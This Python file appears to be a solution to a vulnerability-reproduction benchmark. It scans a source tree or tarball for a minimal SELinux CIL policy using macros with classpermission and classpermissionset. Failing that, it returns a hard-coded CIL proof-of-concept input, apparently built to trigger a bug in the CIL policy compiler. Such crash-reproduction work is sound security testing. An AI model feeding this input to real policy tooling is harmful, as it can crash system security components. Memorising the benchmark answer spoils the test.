import os
import re
import tarfile
from typing import List, Tuple, Optional


def _tokenize_cil(s: str) -> List[Tuple[str, str]]:
    tokens: List[Tuple[str, str]] = []
    i = 0
    n = len(s)
    while i < n:
        c = s[i]
        if c.isspace():
            i += 1
            continue
        if c == '(':
            tokens.append(("P", "("))
            i += 1
            continue
        if c == ')':
            tokens.append(("P", ")"))
            i += 1
            continue
        if c == '"':
            j = i + 1
            esc = False
            while j < n:
                cc = s[j]
                if esc:
                    esc = False
                    j += 1
                    continue
                if cc == '\\':
                    esc = True
                    j += 1
                    continue
                if cc == '"':
                    j += 1
                    break
                j += 1
            tokens.append(("S", s[i:j]))
            i = j
            continue
        j = i
        while j < n:
            cc = s[j]
            if cc.isspace() or cc in '()':
                break
            j += 1
        tokens.append(("A", s[i:j]))
        i = j
    return tokens


def _minify_cil(s: str) -> str:
    toks = _tokenize_cil(s)
    out: List[str] = []
    prev_is_atom = False
    for ttype, tval in toks:
        is_atom = (ttype in ("A", "S"))
        if out and prev_is_atom and is_atom:
            out.append(" ")
        out.append(tval)
        prev_is_atom = is_atom
    return "".join(out)


def _iter_text_files_from_path(src_path: str):
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                yield p, data
        return

    if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = m.name
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            return


def _find_candidate_poc(src_path: str) -> Optional[bytes]:
    best: Optional[Tuple[int, str]] = None
    best_data: Optional[bytes] = None

    required = ("classpermissionset", "macro", "classpermission")
    for name, data in _iter_text_files_from_path(src_path):
        lname = name.lower()
        if not (lname.endswith(".cil") or lname.endswith(".conf") or lname.endswith(".txt") or lname.endswith(".te") or lname.endswith(".policy")):
            continue
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            continue

        t_low = text.lower()
        if any(k not in t_low for k in required):
            continue
        if "(include" in t_low or "include " in t_low:
            continue

        mini = _minify_cil(text).strip()
        if not mini:
            continue
        b = (mini + "\n").encode("utf-8")

        score_key = (len(b), name)
        if best is None or score_key < best:
            best = score_key
            best_data = b

    return best_data


class Solution:
    def solve(self, src_path: str) -> bytes:
        cand = _find_candidate_poc(src_path)
        if cand is not None:
            return cand

        poc = """
        (mls false)
        (user system_u)
        (role system_r)
        (role object_r)
        (type kernel_t)
        (type security_t)
        (type unlabeled_t)
        (sid kernel)
        (sid security)
        (sid unlabeled)
        (userorder (system_u))
        (roleorder (system_r object_r))
        (typeorder (kernel_t security_t unlabeled_t))
        (sidorder (kernel security unlabeled))
        (userrole system_u system_r)
        (userrole system_u object_r)
        (roletype system_r kernel_t)
        (roletype system_r security_t)
        (roletype object_r unlabeled_t)
        (sidcontext kernel (system_u system_r kernel_t))
        (sidcontext security (system_u system_r security_t))
        (sidcontext unlabeled (system_u object_r unlabeled_t))
        (class c (p))
        (classorder (c))
        (macro m ((classpermission x))
            (classpermissionset y (x))
        )
        (call m (c (p)))
        """
        mini = _minify_cil(poc).strip() + "\n"
        return mini.encode("utf-8")